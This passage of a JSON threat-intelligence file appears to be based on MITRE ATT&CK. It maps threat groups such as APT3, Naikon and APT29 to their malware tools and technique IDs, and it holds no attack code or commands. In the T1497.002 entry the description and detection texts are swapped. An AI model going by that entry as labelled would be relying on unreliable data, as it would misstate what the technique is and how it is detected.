                    "T1068": "Exploitation for Privilege Escalation",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1043": "Commonly Used Port",
                    "T1030": "Data Transfer Size Limits",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0398",
            "type": "tool",
            "attributes": {
                "name": "HyperBro",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HyperBro is a custom in-memory backdoor used by Threat Group-3390.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1574.002": "DLL Side-Loading",
                    "T1569.002": "Service Execution",
                    "T1070.004": "File Deletion",
                    "T1113": "Screen Capture",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1055": "Process Injection",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 9
        },
        {
            "id": "S0072",
            "type": "tool",
            "attributes": {
                "name": "OwaAuth",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "OwaAuth is a Web shell and credential stealer deployed to Microsoft Exchange servers that appears to be exclusively used by Threat Group-3390.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1574.002": "DLL Side-Loading",
                    "T1560.003": "Archive via Custom Method",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.006": "Timestomp",
                    "T1505.003": "Web Shell",
                    "T1083": "File and Directory Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "S0070",
            "type": "tool",
            "attributes": {
                "name": "HTTPBrowser",
                "aliases": [
                    "Token Control",
                    "HttpDump"
                ],
                "labels": [
                    "malware"
                ],
                "description": "HTTPBrowser is malware that has been used by several threat groups.   It is believed to be of Chinese origin.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1574.002": "DLL Side-Loading",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 13
        },
        {
            "id": "G0026",
            "type": "group",
            "attributes": {
                "val": 5,
                "name": "APT18",
                "aliases": [
                    "TG-0416",
                    "Dynamite Panda",
                    "Threat Group-0416"
                ],
                "description": "APT18 is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0124": "Pisloader",
                    "S0106": "cmd",
                    "S0071": "hcdLoader",
                    "S0070": "HTTPBrowser",
                    "S0032": "gh0st RAT"
                },
                "techniques": {
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.002": "At (Windows)",
                    "T1133": "External Remote Services",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "S0124",
            "type": "tool",
            "attributes": {
                "name": "Pisloader",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Pisloader is a malware family that is notable due to its use of DNS as a C2 protocol as well as its use of anti-analysis tactics. It has been used by APT18 and is similar to another malware family, HTTPBrowser, that has been used by the group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 9
        },
        {
            "id": "S0071",
            "type": "tool",
            "attributes": {
                "name": "hcdLoader",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "hcdLoader is a remote access tool (RAT) that has been used by APT18.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1543.003": "Windows Service"
                }
            },
            "val": 2
        },
        {
            "id": "G0025",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "APT17",
                "aliases": [
                    "Deputy Dog"
                ],
                "description": "APT17 is a China-based threat group that has conducted network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and non-government organizations.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0069": "BLACKCOFFEE"
                },
                "techniques": {
                    "T1585": "Establish Accounts",
                    "T1583.006": "Web Services",
                    "T1341": "Build social network persona",
                    "T1342": "Develop social network persona digital footprint",
                    "T1331": "Obfuscate infrastructure"
                }
            }
        },
        {
            "id": "G0024",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Putter Panda",
                "aliases": [
                    "APT2",
                    "MSUpdater"
                ],
                "description": "Putter Panda is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA’s 3rd General Staff Department (GSD).",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0068": "httpclient",
                    "S0067": "pngdowner",
                    "S0066": "3PARA RAT",
                    "S0065": "4H RAT"
                },
                "techniques": {
                    "T1562.001": "Disable or Modify Tools",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "S0068",
            "type": "tool",
            "attributes": {
                "name": "httpclient",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "httpclient is malware used by Putter Panda. It is a simple tool that provides a limited range of functionality, suggesting it is likely used as a second-stage or supplementary/backup tool.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell"
                }
            },
            "val": 3
        },
        {
            "id": "S0067",
            "type": "tool",
            "attributes": {
                "name": "pngdowner",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "pngdowner is malware used by Putter Panda. It is a simple tool with limited functionality and no persistence mechanism, suggesting it is used only as a simple \"download-and-\nexecute\" utility.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1552.001": "Credentials In Files",
                    "T1070.004": "File Deletion"
                }
            },
            "val": 3
        },
        {
            "id": "S0066",
            "type": "tool",
            "attributes": {
                "name": "3PARA RAT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "3PARA RAT is a remote access tool (RAT) programmed in C++ that has been used by Putter Panda.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1070.006": "Timestomp",
                    "T1083": "File and Directory Discovery"
                }
            },
            "val": 4
        },
        {
            "id": "S0065",
            "type": "tool",
            "attributes": {
                "name": "4H RAT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "4H RAT is malware that has been used by Putter Panda since at least 2007.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "G0023",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "APT16",
                "aliases": [],
                "description": "APT16 is a China-based threat group that has launched spearphishing campaigns targeting Japanese and Taiwanese organizations.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0064": "ELMER"
                },
                "techniques": {
                    "T1584.004": "Server",
                    "T1272": "Identify business relationships",
                    "T1334": "Compromise 3rd party infrastructure to support delivery"
                }
            }
        },
        {
            "id": "S0064",
            "type": "tool",
            "attributes": {
                "name": "ELMER",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ELMER is a non-persistent, proxy-aware HTTP backdoor written in Delphi that has been used by APT16.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 4
        },
        {
            "id": "G0022",
            "type": "group",
            "attributes": {
                "val": 6,
                "name": "APT3",
                "aliases": [
                    "Gothic Panda",
                    "Pirpi",
                    "UPS Team",
                    "Buckeye",
                    "Threat Group-0110",
                    "TG-0110"
                ],
                "description": "APT3 is a China-based threat group that researchers have attributed to China's Ministry of State Security.   This group is responsible for the campaigns known as Operation Clandestine Fox, Operation Clandestine Wolf, and Operation Double Tap.   As of June 2015, the group appears to have shifted from targeting primarily US victims to primarily political organizations in Hong Kong. \n\nMITRE has also developed an APT3 Adversary Emulation Plan.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0349": "LaZagne",
                    "S0165": "OSInfo",
                    "S0166": "RemoteCMD",
                    "S0111": "schtasks",
                    "S0063": "SHOTPUT",
                    "S0013": "PlugX"
                },
                "techniques": {
                    "T1027.005": "Indicator Removal from Tools",
                    "T1090.002": "External Proxy",
                    "T1074.001": "Local Data Staging",
                    "T1564.003": "Hidden Window",
                    "T1078.002": "Domain Accounts",
                    "T1574.002": "DLL Side-Loading",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1087.001": "Local Account",
                    "T1560.001": "Archive via Utility",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1110.002": "Password Cracking",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1027.002": "Software Packing",
                    "T1552.001": "Credentials In Files",
                    "T1070.004": "File Deletion",
                    "T1136.001": "Local Account",
                    "T1546.008": "Accessibility Features",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1105": "Ingress Tool Transfer",
                    "T1104": "Multi-Stage Channels",
                    "T1098": "Account Manipulation",
                    "T1095": "Non-Application Layer Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1069": "Permission Groups Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0165",
            "type": "tool",
            "attributes": {
                "name": "OSInfo",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "OSInfo is a custom tool used by APT3 to do internal discovery on a victim's computer and network.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1069.001": "Local Groups",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1135": "Network Share Discovery",
                    "T1082": "System Information Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 10
        },
        {
            "id": "S0166",
            "type": "tool",
            "attributes": {
                "name": "RemoteCMD",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "RemoteCMD is a custom tool used by APT3 to execute commands on a remote system similar to SysInternal's PSEXEC functionality.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1569.002": "Service Execution",
                    "T1053.005": "Scheduled Task",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 3
        },
        {
            "id": "S0063",
            "type": "tool",
            "attributes": {
                "name": "SHOTPUT",
                "aliases": [
                    "Backdoor.APT.CookieCutter",
                    "Pirpi"
                ],
                "labels": [
                    "malware"
                ],
                "description": "SHOTPUT is a custom backdoor used by APT3.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1087.001": "Local Account",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "G0021",
            "type": "group",
            "attributes": {
                "val": 6,
                "name": "Molerats",
                "aliases": [
                    "Operation Molerats",
                    "Gaza Cybergang"
                ],
                "description": "Molerats is an Arabic-speaking, politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0553": "MoleNet",
                    "S0547": "DropBook",
                    "S0546": "SharpStage",
                    "S0543": "Spark",
                    "S0062": "DustySky",
                    "S0012": "PoisonIvy"
                },
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1553.002": "Code Signing",
                    "T1218.007": "Msiexec",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "S0553",
            "type": "tool",
            "attributes": {
                "name": "MoleNet",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "MoleNet is a downloader tool with backdoor capabilities that has been observed in use since at least 2019.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1518.001": "Security Software Discovery",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1047": "Windows Management Instrumentation"
                }
            },
            "val": 7
        },
        {
            "id": "S0547",
            "type": "tool",
            "attributes": {
                "name": "DropBook",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "DropBook is a Python-based backdoor compiled with PyInstaller.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.006": "Python",
                    "T1059.003": "Windows Command Shell",
                    "T1567": "Exfiltration Over Web Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1102": "Web Service",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "S0546",
            "type": "tool",
            "attributes": {
                "name": "SharpStage",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SharpStage is a .NET malware with backdoor capabilities.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1102": "Web Service",
                    "T1082": "System Information Discovery",
                    "T1047": "Windows Management Instrumentation"
                }
            },
            "val": 10
        },
        {
            "id": "T1497.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "User Activity Based Checks",
                "chain_phase": "defense-evasion",
                "description": "User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ",
                "detection": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0543",
            "type": "tool",
            "attributes": {
                "name": "Spark",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Spark is a Windows backdoor and has been in use since as early as 2017.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1497.002": "User Activity Based Checks",
                    "T1027.002": "Software Packing",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1082": "System Information Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 9
        },
        {
            "id": "S0062",
            "type": "tool",
            "attributes": {
                "name": "DustySky",
                "aliases": [
                    "NeD Worm"
                ],
                "labels": [
                    "malware"
                ],
                "description": "DustySky is multi-stage malware written in .NET that has been used by Molerats since May 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1570": "Lateral Tool Transfer",
                    "T1518.001": "Security Software Discovery",
                    "T1560.001": "Archive via Utility",
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1518": "Software Discovery",
                    "T1120": "Peripheral Device Discovery",
                    "T1113": "Screen Capture",
                    "T1091": "Replication Through Removable Media",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 19
        },
        {
            "id": "G0020",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Equation",
                "aliases": [],
                "description": "Equation is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard disk drives.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1564.005": "Hidden File System",
                    "T1480.001": "Environmental Keying",
                    "T1542.002": "Component Firmware",
                    "T1120": "Peripheral Device Discovery",
                    "T1109": "Component Firmware"
                }
            }
        },
        {
            "id": "G0019",
            "type": "group",
            "attributes": {
                "val": 13,
                "name": "Naikon",
                "aliases": [],
                "description": "Naikon is a threat group that has focused on targets around the South China Sea. The group has been attributed to the Chinese People’s Liberation Army’s (PLA) Chengdu Military Region Second Technical Reconnaissance Bureau(Military Unit Cover Designator 78020). While Naikon shares some characteristics with APT30, the two groups do not appear to be exact matches.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0456": "Aria-body",
                    "S0108": "netsh",
                    "S0097": "Ping",
                    "S0096": "Systeminfo",
                    "S0095": "FTP",
                    "S0061": "HDoor",
                    "S0060": "Sys10",
                    "S0059": "WinMM",
                    "S0058": "SslMM",
                    "S0057": "Tasklist",
                    "S0055": "RARSTONE",
                    "S0039": "Net",
                    "S0029": "PsExec"
                },
                "techniques": {
                    "T1574.002": "DLL Side-Loading",
                    "T1204.002": "Malicious File",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1137.006": "Add-ins",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "S0456",
            "type": "tool",
            "attributes": {
                "name": "Aria-body",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Aria-body is a custom backdoor that has been used by Naikon.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1560": "Archive Collected Data",
                    "T1134.002": "Create Process with Token",
                    "T1134.001": "Token Impersonation/Theft",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1113": "Screen Capture",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1025": "Data from Removable Media",
                    "T1016": "System Network Configuration Discovery",
                    "T1010": "Application Window Discovery"
                }
            },
            "val": 23
        },
        {
            "id": "S0061",
            "type": "tool",
            "attributes": {
                "name": "HDoor",
                "aliases": [
                    "Custom HDoor"
                ],
                "labels": [
                    "malware"
                ],
                "description": "HDoor is malware that has been customized and used by the Naikon group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1562.001": "Disable or Modify Tools",
                    "T1046": "Network Service Scanning"
                }
            },
            "val": 2
        },
        {
            "id": "S0060",
            "type": "tool",
            "attributes": {
                "name": "Sys10",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Sys10 is a backdoor that was used throughout 2013 by Naikon.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1069.001": "Local Groups",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "S0059",
            "type": "tool",
            "attributes": {
                "name": "WinMM",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "WinMM is a full-featured, simple backdoor used by Naikon.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 6
        },
        {
            "id": "S0058",
            "type": "tool",
            "attributes": {
                "name": "SslMM",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SslMM is a full-featured backdoor used by Naikon that has multiple variants.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1562.001": "Disable or Modify Tools",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1134": "Access Token Manipulation",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 9
        },
        {
            "id": "S0055",
            "type": "tool",
            "attributes": {
                "name": "RARSTONE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "RARSTONE is malware used by the Naikon group that has some characteristics similar to PlugX.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1083": "File and Directory Discovery"
                }
            },
            "val": 4
        },
        {
            "id": "G0018",
            "type": "group",
            "attributes": {
                "val": 7,
                "name": "admin@338",
                "aliases": [],
                "description": "admin@338 is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as PoisonIvy, as well as some non-public backdoors.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0104": "netstat",
                    "S0100": "ipconfig",
                    "S0096": "Systeminfo",
                    "S0043": "BUBBLEWRAP",
                    "S0042": "LOWBALL",
                    "S0039": "Net",
                    "S0012": "PoisonIvy"
                },
                "techniques": {
                    "T1069.001": "Local Groups",
                    "T1204.002": "Malicious File",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.001": "Local Account",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1203": "Exploitation for Client Execution",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery"
                }
            }
        },
        {
            "id": "S0043",
            "type": "tool",
            "attributes": {
                "name": "BUBBLEWRAP",
                "aliases": [
                    "Backdoor.APT.FakeWinHTTPHelper"
                ],
                "labels": [
                    "malware"
                ],
                "description": "BUBBLEWRAP is a full-featured, second-stage backdoor used by the admin@338 group. It is set to run when the system boots and includes functionality to check, upload, and register plug-ins that can further enhance its capabilities.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1095": "Non-Application Layer Protocol",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 3
        },
        {
            "id": "S0042",
            "type": "tool",
            "attributes": {
                "name": "LOWBALL",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "LOWBALL is malware used by admin@338. It was used in August 2015 in email messages targeting Hong Kong-based media organizations.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1105": "Ingress Tool Transfer",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 4
        },
        {
            "id": "G0017",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "DragonOK",
                "aliases": [],
                "description": "DragonOK is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools, DragonOK is thought to have a direct or indirect relationship with the threat group Moafee.  It is known to use a variety of malware, including Sysget/HelloBridge, PlugX, PoisonIvy, FormerFirstRat, NFlog, and NewCT.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0013": "PlugX",
                    "S0012": "PoisonIvy"
                },
                "techniques": {}
            }
        },
        {
            "id": "G0016",
            "type": "group",
            "attributes": {
                "val": 34,
                "name": "APT29",
                "aliases": [
                    "Dark Halo",
                    "StellarParticle",
                    "NOBELIUM",
                    "UNC2452",
                    "YTTRIUM",
                    "The Dukes",
                    "Cozy Bear",
                    "CozyDuke"
                ],
                "description": "APT29 is threat group that has been attributed to Russia's Foreign Intelligence Service (SVR). They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. APT29 reportedly compromised the Democratic National Committee starting in the summer of 2015.\n\nIn April 2021, the US and UK governments attributed the SolarWinds supply chain compromise cyber operation to the SVR; public statements included citations to APT29, Cozy Bear, and The Dukes. Victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. Industry reporting referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, and Dark Halo.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0597": "GoldFinder",
                    "S0589": "Sibot",
                    "S0588": "GoldMax",
                    "S0565": "Raindrop",
                    "S0562": "SUNSPOT",
                    "S0560": "TEARDROP",
                    "S0559": "SUNBURST",
                    "S0552": "AdFind",
                    "S0516": "SoreFang",
                    "S0515": "WellMail",
                    "S0514": "WellMess",
                    "S0511": "RegDuke",
                    "S0518": "PolyglotDuke",
                    "S0195": "SDelete",
                    "S0183": "Tor",
                    "S0175": "meek",
                    "S0154": "Cobalt Strike",
                    "S0150": "POSHSPY",
                    "S0139": "PowerDuke",
                    "S0100": "ipconfig",
                    "S0096": "Systeminfo",
                    "S0057": "Tasklist",
                    "S0054": "CloudDuke",
                    "S0053": "SeaDuke",
                    "S0052": "OnionDuke",
                    "S0051": "MiniDuke",
                    "S0050": "CosmicDuke",
                    "S0049": "GeminiDuke",
                    "S0048": "PinchDuke",
                    "S0046": "CozyCar",
                    "S0039": "Net",
                    "S0037": "HAMMERTOSS",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1016.001": "Internet Connection Discovery",
                    "T1484.002": "Domain Trust Modification",
                    "T1606.002": "SAML Tokens",
                    "T1606.001": "Web Cookies",
                    "T1587.003": "Digital Certificates",
                    "T1587.001": "Malware",
                    "T1584.001": "Domains",
                    "T1583.006": "Web Services",
                    "T1583.001": "Domains",
                    "T1071.001": "Web Protocols",
                    "T1048.002": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
                    "T1001.002": "Steganography",
                    "T1090.004": "Domain Fronting",
                    "T1090.003": "Multi-hop Proxy",
                    "T1090.001": "Internal Proxy",
